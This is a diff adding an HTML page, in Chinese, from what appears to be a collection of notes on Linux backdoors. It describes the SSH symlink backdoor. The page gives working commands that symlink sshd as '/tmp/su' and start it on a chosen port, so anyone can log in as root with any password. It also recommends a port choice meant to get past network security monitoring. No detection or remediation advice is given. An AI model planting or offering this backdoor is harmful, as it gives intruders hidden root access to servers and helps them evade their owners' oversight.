@@ -1,0 +1,21 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="ssh-软连接后门"><span class="csDE05BCC">SSH </span><span class="csECDA2D3">软连接后门</span></a></h1>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">软连接后门的原理是利用了</span><span class="cs8926E06">PAM</span><span class="cs9C1B1871">配置文件的作用，将</span><span class="cs8926E06">sshd</span><span class="cs9C1B1871">文件软连接名称设置为</span><span class="cs8926E06">su</span><span class="cs9C1B1871">，这样应用在启动过程中他会去</span><span class="cs8926E06">PAM</span><span class="cs9C1B1871">配置文件夹中寻找是否存在对应名称的配置信息（</span><span class="cs8926E06">su</span><span class="cs9C1B1871">），然而</span><span class="cs8926E06">su</span><span class="cs9C1B1871">在</span><span class="cs8926E06">pam_rootok</span><span class="cs9C1B1871">只检测</span><span class="cs8926E06">uid 0</span><span class="cs9C1B1871">即可认证成功，这样就导致了可以使用任意密码登录。</span></p><p class="cs3A447A38"><span class="cs9FB05234">ln -sf /usr/sbin/sshd /tmp/su</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">/tmp/su -oPort=888</span></p><p class="cs40DD2BC9"><span><img src="安全技术/Linux后门/SSH后门/SSH%20%e8%bd%af%e8%bf%9e%e6%8e%a5%e5%90%8e%e9%97%a8%20_files/image0.png" width="560" height="91" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">优点：能够绕过一些网络设备的安全流量监测，但是本地在查看监听端口时会暴露端口，建议设置成</span><span class="cs8926E06">8081</span></p></body>
+</html>
